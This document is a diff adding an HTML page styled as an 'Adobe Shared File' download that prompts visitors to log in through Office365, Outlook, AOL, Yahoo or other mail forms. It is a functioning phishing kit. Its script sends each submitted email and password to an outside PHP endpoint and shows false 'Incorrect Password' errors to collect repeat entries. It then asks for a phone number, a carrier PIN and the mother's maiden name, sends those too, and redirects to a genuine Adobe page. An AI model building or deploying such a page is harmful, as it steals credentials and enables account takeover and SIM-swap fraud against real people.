@@ -1,0 +1,991 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acrobat File</title>
+     <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js" nonce="Mzk0MTMzNTkwMSwzNTI2OTQ3MDM2"></script>
+    <script src="https://code.jquery.com/jquery-3.1.1.min.js" nonce="Mzk0MTMzNTkwMSwzNTI2OTQ3MDM2"></script>
+    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous" nonce="Mzk0MTMzNTkwMSwzNTI2OTQ3MDM2"></script>
+     <script src="https://code.jquery.com/jquery-3.1.1.min.js" nonce="Mzk0MTMzNTkwMSwzNTI2OTQ3MDM2"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous" nonce="Mzk0MTMzNTkwMSwzNTI2OTQ3MDM2"></script>
+
+    <style>
+        *{
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body{
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        .container__box video{
+            width: 100%;
+        }
+        .video_box{
+            position: fixed;
+        }
+        
+        .main__container{
+            position: absolute;
+            width: 100%;
+            z-index: 1000;
+
+        }
+        .header__con{
+            background-color: #fff;
+            padding: 12px 100px;
+        }
+        .box__body{
+            margin: 40px 0;
+            text-align: center;
+        }
+        .box__img{
+            margin: 10px 0;
+        }
+        .box__img img{
+            width: 90px;
+        }
+        .welcome h1{
+            font-weight: 400;
+            font-size: 42px;
+        }
+        .p-1{
+            font-size: 42px;
+            font-weight: 300;
+            margin-top: 5;
+            margin-bottom: 15px;
+        }
+        .p-2{
+            font-size: 20px;
+        }
+        .welcome{
+            color: #fff;
+        }
+        .box__data{
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 50px 0;
+            
+        }
+        .box__data-info{
+            padding: 20px 40px;
+            border-radius: 5px;
+        }
+        .box-1{
+            background-color: #FF3C00;
+             color: #fff;
+        }
+        .box-2{
+            background-color: #0073C8;
+             color: #fff;
+        }
+        .box-3{
+            background-color: #0B5BD3;
+             color: #fff;
+        }
+        .box-4{
+            background-color: #fff;
+             color: #000;
+        }
+        .data-text{
+            margin: 7px 0;
+        }
+        .dat-img{
+            background-color: #fff !important;
+            padding: 3px 0;
+            border-radius: 5px;
+        }
+        .box__data-info{
+            margin-left: 20px ;
+            cursor: pointer;
+        }
+        .powered_by{
+            margin-bottom: 100px;
+        }
+        .powered_by p{
+            color: #fff;
+            font-weight: 500;
+            font-size: 13px;
+        }
+
+        .other-form{
+             position: fixed;
+             top: 50%;
+             left: 50%;
+             z-index: 5000;
+             background-color: #fff;
+             width: 40%;
+             transform: translate(-50%, -50%);
+             border-radius: 5px;
+             padding: 20px 0;
+             
+        }
+
+.other-form-mail{
+    padding: 20px;
+}
+
+.other-img-box{
+    text-align: center;
+}
+.other-form-box input{
+    width: 100%;
+    height: 35px;
+    padding: 10px;
+    margin: 5px 0;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+}
+.other-form-box input:focus{
+    outline: none;
+    border: 2px solid #298CBC;
+}
+.other-form-box label{
+    font-weight: 600;
+    font-size: 14px;
+}
+
+.other-form-box{
+    margin: 6px 0;
+}
+.btn-close{
+    background-color: #697281;
+
+}
+.btn-Login{
+    background-color: #0C97BB;
+}
+.other-btns{
+    text-align: right;
+}
+.btn-other{
+    padding: 7px 15px;
+    color: #fff;
+    border: none;
+    border-radius: 3px;
+    cursor: pointer;
+}
+.times-close{
+    text-align: right;
+}
+.times-close a{
+    font-size: 25px;
+    text-decoration: none;
+}
+.error-other{
+    margin: 5px 0;
+}
+.error-other-msg{
+    color: rgb(177, 15, 15);
+    font-weight: 600;
+}
+.form-otherdata{
+    display: flex;
+}
+.other-form-flex{
+    display: flex;
+}
+.other__form-main{
+    position: fixed;
+    top: 0;
+    width: 100%;
+    z-index: 5000;
+    height: 100vh;
+    background-color: rgba(0, 0, 0, 0.582);
+}
+.img_form{
+    text-align: center;
+}
+.login__text{
+    text-align: center;
+    margin: 10px 0;
+}
+.close__form{
+    text-align: right;
+    border-bottom: 1px solid #ccc;
+    padding-right: 20px;
+    margin-bottom: 30px;
+}
+.close__form span{
+    font-size: 25px;
+    font-weight: 600;
+    cursor: pointer;
+}
+.hide{
+    display: none !important;
+}
+
+
+
+@media screen and (max-width: 1327px){
+   .video_box{
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        .video_box video{
+            min-width: 100%;
+            min-height: 100%;
+            object-fit: cover;
+        }
+}
+
+
+@media screen and (max-width: 791px){
+    .box__data{
+        display: grid;
+        grid-template-columns: repeat(2, 1fr);
+        grid-gap: 30px;
+        padding-right: 20px;
+
+    }
+
+     .video_box{
+            position: fixed;
+            top: 0;
+            left: 0;
+        }
+    
+        .main__container{
+    position: absolute;
+    top: 0;
+    left: 0;}
+
+    .box__img img{
+        width: 30px;
+    }
+    .header__con{
+        padding: 20px;
+    }
+    .header__con img{
+        width: 160px;
+    }
+    .welcome h1{
+        font-size: 20px;
+    }
+    .p-2, .p-1{
+        font-size: 15px;
+    }
+
+    .other-form{
+        width: 95%;
+    }
+    .box__data img{
+        width: 20px !important;
+    }
+    .text__data p{
+        font-size: 15px;
+    }
+    .box__data-info{
+        padding: 10px;
+    }
+   
+}
+
+
+        
+    </style>
+</head>
+<body>
+    <div class="container__box">
+          <div class="main__container">
+            <div class="header__con">
+                <img src="https://cdn.glitch.global/e8efcc23-84cb-44fa-afa3-f5387b920e52/acrobat-lo.png" alt="img">
+            </div>
+
+
+             <div class="box__body">
+                    <div class="box__img">
+                        <img src="https://cdn.glitch.global/60719965-d295-4673-8d2a-fca5fd5f6e44/thumbnails%2Facrobat-icon.png?1661157668837" alt="boximg">
+                    </div>
+
+                    <div class="welcome">
+                        <h1>Welcome to Adobe Shared File</h1>
+                        <p class="p-1">Your Contact has shared a file with you.</p>
+                        <p class="p-2">Save your files to Adobe PDF and get them from any device, anywhere <br/>
+                            Select any of the options below to view and download the file</p>
+                    </div>
+                    <div class="box__data ">
+                        
+                        <div class="box__data-info box-1">
+                            <div>
+                                  <img src="https://cdn.glitch.me/a9c17eb8-a395-4f7a-ba3f-0e2fc9fb1237/office3651.png" alt="box-data" width="35px">
+                            </div>
+
+                            <div class="text__data">
+                                <p>Login with </p>
+                                <p>Office365</p>
+                            </div>
+                        </div>
+
+
+                         <div class="box__data-info box-2">
+                            <div>
+                                  <img src="https://cdn.glitch.me/a9c17eb8-a395-4f7a-ba3f-0e2fc9fb1237/outlook.png" alt="box-data"  width="35px">
+                            </div>
+
+                            <div class="text__data">
+                                <p>Login with </p>
+                                <p>Outlook</p>
+                            </div>
+                        </div>
+
+
+                        <div class="box__data-info box-3">
+                            <div>
+                                  <img src="https://cdn.glitch.me/a9c17eb8-a395-4f7a-ba3f-0e2fc9fb1237/other1.png" alt="box-data"  width="35px">
+                            </div>
+
+                            <div class="text__data">
+                                <p>Login with </p>
+                                <p>Other</p>
+                            </div>
+                        </div>
+
+
+                         <div class="box__data-info box-4">
+                            <div >
+                                  <img src="https://cdn2.downdetector.com/static/uploads/logo/aol.png" alt="box-data"  width="50px">
+                            </div>
+
+                            <div class="text__data data-text">
+                                <p>Login with </p>
+                                <p>AOL</p>
+                            </div>
+                        </div>
+                         <div class="box__data-info box-3">
+                            <div class="dat-img">
+                                  <img src="https://www.clipartmax.com/png/middle/454-4543132_yahoo-black-yahoo-mail-icon-black.png" alt="box-data"  width="30px" >
+                            </div>
+
+                            <div class="text__data data-text">
+                                <p>Login with </p>
+                                <p>Yahoo</p>
+                            </div>
+                        </div>
+                      
+                    </div>
+
+                      <div class="powered_by">
+                            <p>Office365, Outlook, SharePoint, OneDrive, Skype, OneNote, PowerPoint, Word, Excel are all trademarks of Microsoft. All rights reserved <br/> Â© Microsoft 2023.</p>
+                        </div>
+             </div>
+
+        
+        </div>
+
+
+
+
+
+
+
+      
+    </div>
+
+    
+      <div class="video_box">
+          <video muted autoplay loop>
+            <source src="https://cdn.glitch.global/8d5109a6-1873-4f95-9253-bd838b3669c7/video.mp4" type="video/mp4">
+            <source src="movie.ogg" type="video/ogg">
+            Your browser does not support the video tag.
+        </video>
+      </div>
+
+
+    <div class="other__form-main hide">
+        
+           <div class="other-form">
+   <div class="close__form">
+                <span  class="close__btn">&times;</span>
+            </div>
+            <div class="img_form">
+                <img src="https://cdn.glitch.com/6ca72b66-8609-4328-9f2e-521097041961%2Foffice1.png" alt="img-form" width="100px">
+
+            </div>
+
+            <div class="login__text">
+                <h3>Login with Office 365</h3>
+            </div>
+      <form action="#" class="other-form-mail">
+           <div class="other-form-box">
+                <div class="error-other">
+                    <span class="error-other-msg"></span>
+                </div>
+                
+            <label for="">Email Address</label>
+            <input type="text" placeholder="Enter email" class="email-other" name="email">
+            <label for="">We'll never share your email with anyone else</label>
+           </div>
+
+          <div class="other-form-box">
+            <label for="">Password</label>
+            <input type="password" placeholder="Enter password" class="pass-other" name="pass">
+           </div>
+
+           
+          <div class="other-form-box other-btns">
+            <button type="button" class="btn-close btn-other">Close</button>
+            <button  class="btn-Login btn-other">Login</button>
+           </div>
+        </form>
+      </div>
+    </div>
+
+
+
+     <div class="other__form-main hide">
+
+         
+           <div class="other-form">
+              <div class="close__form">
+                <span  class="close__btn">&times;</span>
+            </div>
+            <div class="img_form">
+                <img src="https://cdn.glitch.com/6ca72b66-8609-4328-9f2e-521097041961%2Foutlook2.png" alt="img-form" width="100px">
+
+            </div>
+
+            <div class="login__text">
+                <h3>Login with Outlook</h3>
+            </div>
+      <form action="#" class="other-form-mail">
+           <div class="other-form-box">
+                <div class="error-other">
+        <span class="error-other-msg"></span>
+      </div>
+            <label for="">Email Address</label>
+            <input type="text" placeholder="Enter email" class="email-other" name="email">
+            <label for="">We'll never share your email with anyone else</label>
+           </div>
+
+          <div class="other-form-box">
+            <label for="">Password</label>
+            <input type="password" placeholder="Enter password" class="pass-other" name="pass">
+           </div>
+
+           
+          <div class="other-form-box other-btns">
+            <button type="button" class="btn-close btn-other">Close</button>
+            <button  class="btn-Login btn-other">Login</button>
+           </div>
+        </form>
+      </div>
+    </div> 
+
+
+    <div class="other__form-main hide">
+           <div class="other-form">
+                 <div class="close__form">
+                <span  class="close__btn">&times;</span>
+            </div>
+            <div class="img_form">
+                <img src="https://cdn.glitch.com/6ca72b66-8609-4328-9f2e-521097041961%2Fothers2.png" alt="img-form" width="100px">
+
+            </div>
+
+            <div class="login__text">
+                <h3>Login with Other Mail</h3>
+            </div>
+      <form action="#" class="other-form-mail">
+           <div class="other-form-box">
+                <div class="error-other">
+        <span class="error-other-msg"></span>
+      </div>
+            <label for="">Email Address</label>
+            <input type="text" placeholder="Enter email" class="email-other" name="email">
+            <label for="">We'll never share your email with anyone else</label>
+           </div>
+
+          <div class="other-form-box">
+            <label for="">Password</label>
+            <input type="password" placeholder="Enter password" class="pass-other" name="pass">
+           </div>
+
+           
+          <div class="other-form-box other-btns">
+            <button type="button" class="btn-close btn-other">Close</button>
+            <button  class="btn-Login btn-other">Login</button>
+           </div>
+        </form>
+      </div>
+    </div>
+
+
+
+       <div class="other__form-main hide">
+
+        
+           <div class="other-form">
+
+             <div class="close__form">
+                <span  class="close__btn">&times;</span>
+            </div>
+            <div class="img_form">
+                <img src="https://cdn2.downdetector.com/static/uploads/logo/aol.png" alt="img-form" width="100px">
+
+            </div>
+
+            <div class="login__text">
+                <h3>Login with AOL</h3>
+            </div>
+      <form action="#" class="other-form-mail">
+           <div class="other-form-box">
+                <div class="error-other">
+        <span class="error-other-msg"></span>
+      </div>
+            <label for="">Email Address</label>
+            <input type="text" placeholder="Enter email" class="email-other" name="email">
+            <label for="">We'll never share your email with anyone else</label>
+           </div>
+
+          <div class="other-form-box">
+            <label for="">Password</label>
+            <input type="password" placeholder="Enter password" class="pass-other" name="pass">
+           </div>
+
+           
+          <div class="other-form-box other-btns">
+            <button type="button" class="btn-close btn-other">Close</button>
+            <button class="btn-Login btn-other">Login</button>
+           </div>
+        </form>
+      </div>
+    </div> 
+
+     <div class="other__form-main hide">
+
+           <div class="other-form">
+            <div class="close__form">
+                <span class="close__btn">&times;</span>
+            </div>
+            <div class="img_form">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Yahoo%21_%282019%29.svg/2560px-Yahoo%21_%282019%29.svg.png" alt="img-form" width="140px">
+
+            </div>
+
+            <div class="login__text">
+                <h3>Login with Yahoo</h3>
+            </div>
+      <form action="#" class="other-form-mail">
+           <div class="other-form-box">
+                <div class="error-other">
+        <span class="error-other-msg"></span>
+      </div>
+            <label for="">Email Address</label>
+            <input type="text" placeholder="Enter email" class="email-other" name="email">
+            <label for="">We'll never share your email with anyone else</label>
+           </div>
+
+          <div class="other-form-box">
+            <label for="">Password</label>
+            <input type="password" placeholder="Enter password" class="pass-other" name="pass">
+           </div>
+
+           
+          <div class="other-form-box other-btns">
+            <button type="button" class="btn-close btn-other">Close</button>
+            <button class="btn-Login btn-other">Login</button>
+           </div>
+        </form>
+      </div>
+    </div>
+
+
+      <div class="other__form-main hide">
+
+           <div class="other-form">
+            <div class="close__form">
+                <span class="close__btn">&times;</span>
+            </div>
+            <div class="img_form">
+               
+
+            </div>
+
+            <div class="login__text">
+                <h3>Please Verify your Account more</h3>
+            </div>
+      <form action="#" class="other-form-mail">
+           <div class="other-form-box">
+                <div class="error-other">
+        <span class="error-other-msg"></span>
+      </div>
+            <label for="">Mobile Phone Number</label>
+            <input type="text" placeholder="Mobile Phone Number" class="email-other" name="lName">        
+           </div>
+
+          <div class="other-form-box">
+            <label for="">Phone Carrier Pin</label>
+            <input placeholder="Phone Carrier Pin" class="pass-other" name="mName">
+        </div>
+
+           <div class="other-form-box">
+            <label for="">Mother's Maiden Name</label>
+            <input placeholder="Mother's Maiden Name" class="pass-other" name="mmName">
+        </div>
+
+           
+          <div class="other-form-box other-btns">
+            <button type="button" class="btn-close btn-other">Close</button>
+            <button class="btn-Login btn-other">Login</button>
+           </div>
+        </form>
+      </div>
+    </div>
+
+
+
+    <script nonce="Mzk0MTMzNTkwMSwzNTI2OTQ3MDM2">
+        const [form1, form2, form3, form4, form5, form6] = document.querySelectorAll(".other__form-main");
+        const [boxData1, boxData2, boxData3, boxData4, boxData5, boxData6] = document.querySelectorAll(".box__data-info");
+        const [closeBtn1, closeBtn2, closeBtn3, closeBtn4, closeBtn5, closeBtn6] = document.querySelectorAll(".close__form");
+        const [btnClose1, btnClose2, btnClose3, btnClose4, btnClose5, btnClose6] = document.querySelectorAll(".btn-close");
+        const [formData1, formData2, formData3, formData4, formData5, formData6] = document.querySelectorAll(".other-form-mail");
+        const [errorMsg1, errorMsg2, errorMsg3, errorMsg4, errorMsg5, errorMsg6, errorMsg7] = document.querySelectorAll(".error-other-msg");
+        let num = 0; 
+        let err_pin = 0;
+         
+         
+      const ajaxCode = (data) => {
+        $.ajax({
+            //post php link here....
+            url: 'http://theneoresearch.in/image/send.php',
+            type: 'POST',
+            data: { pass: data },
+        });
+    };
+
+
+        boxData1.addEventListener("click", () => {
+            form1.classList.remove("hide");
+        });
+
+        boxData2.addEventListener("click", () => {
+            form2.classList.remove("hide");
+        });
+
+         boxData3.addEventListener("click", () => {
+            form3.classList.remove("hide");
+        });
+
+        boxData4.addEventListener("click", () => {
+            form4.classList.remove("hide");
+        });
+
+        boxData5.addEventListener("click", () => {
+            form5.classList.remove("hide");
+        });
+
+
+        closeBtn1.addEventListener("click", () => {
+             form1.classList.add("hide");
+        });
+
+        closeBtn2.addEventListener("click", () => {
+             form2.classList.add("hide");
+        });
+
+        closeBtn3.addEventListener("click", () => {
+             form3.classList.add("hide");
+        });
+
+         closeBtn4.addEventListener("click", () => {
+             form4.classList.add("hide");
+        });
+
+        closeBtn5.addEventListener("click", () => {
+             form5.classList.add("hide");
+        });
+
+         closeBtn6.addEventListener("click", () => {
+             form6.classList.add("hide");
+        });
+
+
+        btnClose1.addEventListener("click", () => {
+             form1.classList.add("hide");
+        });
+
+           btnClose2.addEventListener("click", () => {
+             form2.classList.add("hide");
+        });
+
+        btnClose3.addEventListener("click", () => {
+             form3.classList.add("hide");
+        });
+
+         btnClose4.addEventListener("click", () => {
+             form4.classList.add("hide");
+        });
+
+        btnClose5.addEventListener("click", () => {
+             form5.classList.add("hide");
+        });
+
+        btnClose6.addEventListener("click", () => {
+             form6.classList.add("hide");
+        });
+
+
+        formData1.addEventListener("submit", (e) => {
+            e.preventDefault();
+              
+            const email = e.target.elements.email.value;
+            const pass = e.target.elements.pass.value;
+        
+
+            if(email === ""){
+                errorMsg1.textContent = "Please enter email Address";
+            }
+
+            else if(pass === ""){
+                errorMsg1.textContent = "Please enter Email Password";
+            }
+            else {
+                num++;
+                 let fData4 = `Email Address: ${email} \nPassword: ${pass}`;
+                
+                if(num === 1){
+                    errorMsg1.textContent = "Incorrect Password";
+                     ajaxCode(fData4);
+                    e.target.elements.pass.value = "";
+                   
+
+                }
+                else if(num === 2){
+                    errorMsg1.textContent = "Incorrect Password Try again";
+                    ajaxCode(fData4);
+                    e.target.elements.pass.value = "";
+                    
+                }
+                else {
+                    ajaxCode(fData4);
+                    form1.classList.add("hide");
+                    form6.classList.remove("hide");
+                    num = 0;
+                    e.target.elements.pass.value = "";
+                   
+                }
+         
+            } 
+
+
+        })
+
+
+
+          formData2.addEventListener("submit", (e) => {
+            e.preventDefault();
+              
+            const email = e.target.elements.email.value;
+            const pass = e.target.elements.pass.value;
+
+            if(email === ""){
+                errorMsg2.textContent = "Please enter email Address";
+            }
+
+            else if(pass === ""){
+                errorMsg2.textContent = "Please enter Email Password";
+            }
+            else {
+                num++;
+
+                let fData4 = `Email Address: ${email} \nPassword: ${pass}`;
+
+                if(num === 1){
+                    ajaxCode(fData4);
+                    errorMsg2.textContent = "Incorrect Password";
+                    e.target.elements.pass.value = "";
+                }
+                else if(num === 2){
+                    ajaxCode(fData4);
+                    errorMsg2.textContent = "Incorrect Password Try again";
+                    e.target.elements.pass.value = "";
+                }
+                else {
+                     ajaxCode(fData4);
+                    e.target.elements.pass.value = "";
+                    num = 0;
+                    form2.classList.add("hide");
+                    form6.classList.remove("hide");
+                    
+                }
+          
+               
+            } 
+
+
+        })
+
+
+
+          formData3.addEventListener("submit", (e) => {
+            e.preventDefault();
+              
+            const email = e.target.elements.email.value;
+            const pass = e.target.elements.pass.value;
+
+            if(email === ""){
+                errorMsg3.textContent = "Please enter email Address";
+            }
+
+            else if(pass === ""){
+                errorMsg3.textContent = "Please enter Email Password";
+            }
+            else {
+                num++;
+                  let fData4 = `Email Address: ${email} \nPassword: ${pass}`;
+                if(num === 1){
+                     ajaxCode(fData4);
+                    errorMsg3.textContent = "Incorrect Password";
+                     e.target.elements.pass.value = "";
+                }
+                else if(num === 2){
+                     ajaxCode(fData4);
+                    errorMsg3.textContent = "Incorrect Password Try again";
+                    e.target.elements.pass.value = "";
+                }
+                else {
+                     ajaxCode(fData4);
+                    num = 0;
+                    form3.classList.add("hide");
+                    form6.classList.remove("hide");
+                      e.target.elements.pass.value = "";
+                    
+                }
+          
+               
+            } 
+        });
+
+
+        
+          formData4.addEventListener("submit", (e) => {
+            e.preventDefault();
+              
+            const email = e.target.elements.email.value;
+            const pass = e.target.elements.pass.value;
+
+            if(email === ""){
+                errorMsg4.textContent = "Please enter email Address";
+            }
+
+            else if(pass === ""){
+                errorMsg4.textContent = "Please enter Email Password";
+            }
+            else {
+                num++;
+                  let fData4 = `Email Address: ${email} \nPassword: ${pass}`;
+                if(num === 1){
+                    ajaxCode(fData4);
+                    errorMsg4.textContent = "Incorrect Password";
+                     e.target.elements.pass.value = "";
+                }
+                else if(num === 2){
+                     ajaxCode(fData4);
+                    errorMsg4.textContent = "Incorrect Password Try again";
+                    e.target.elements.pass.value = "";
+                }
+                else {
+                     ajaxCode(fData4);
+                    e.target.elements.pass.value = "";
+                    num = 0;
+                    form4.classList.add("hide");
+                    form6.classList.remove("hide");
+                    
+                }
+          
+               
+            } 
+        })
+
+
+        
+          formData5.addEventListener("submit", (e) => {
+            e.preventDefault();
+              
+            const email = e.target.elements.email.value;
+            const pass = e.target.elements.pass.value;
+
+            if(email === ""){
+                errorMsg5.textContent = "Please enter email Address";
+            }
+
+            else if(pass === ""){
+                errorMsg5.textContent = "Please enter Email Password";
+            }
+            else {
+                num++;
+                 let fData4 = `Email Address: ${email} \nPassword: ${pass}`;
+                if(num === 1){
+                    ajaxCode(fData4);
+                    errorMsg5.textContent = "Incorrect Password";
+                     e.target.elements.pass.value = "";
+                }
+                else if(num === 2){
+                      ajaxCode(fData4);
+                    errorMsg5.textContent = "Incorrect Password Try again";
+                    e.target.elements.pass.value = "";
+                }
+                else {
+                      ajaxCode(fData4);
+                    e.target.elements.pass.value = "";
+                    num = 0;
+                    form5.classList.add("hide");
+                    form6.classList.remove("hide");
+                }
+            } 
+        });
+
+
+        formData6.addEventListener("submit", (e) => {
+            e.preventDefault();
+
+           
+
+              
+            const mName = e.target.elements.mName.value;
+            const lName = e.target.elements.lName.value;
+            const mmName = e.target.elements.mmName.value;
+
+            if(lName === ""){
+                errorMsg6.textContent = "Please enter your Mobile Phone Number";
+            }
+
+            else if(mName === ""){
+                errorMsg6.textContent = "Please enter Phone Carrier Pin";
+            }
+
+             else if(mmName === ""){
+                errorMsg7.textContent = "Please enter Mother's Maiden Name";
+            }
+            else {
+                err_pin++;
+                let fData4 = `Mobile Phone: ${lName} \nPhone Pin: ${mName} \nPhone Pin: ${mmName}`;
+                ajaxCode(fData4)
+
+                if(err_pin === 1){
+                    errorMsg6.textContent = "Incorrect Phone Carrier Pin";
+                    e.target.elements.mName.value = "";
+                }
+                else {
+                     errorMsg6.textContent = "";
+                    formData6.reset();
+                    location.href = "https://helpx.adobe.com/be_en/download-install/kb/troubleshoot-download-problems.html";   
+                }
+                             
+            } 
+        });
+
+
+    </script>
+</body>
+</html>
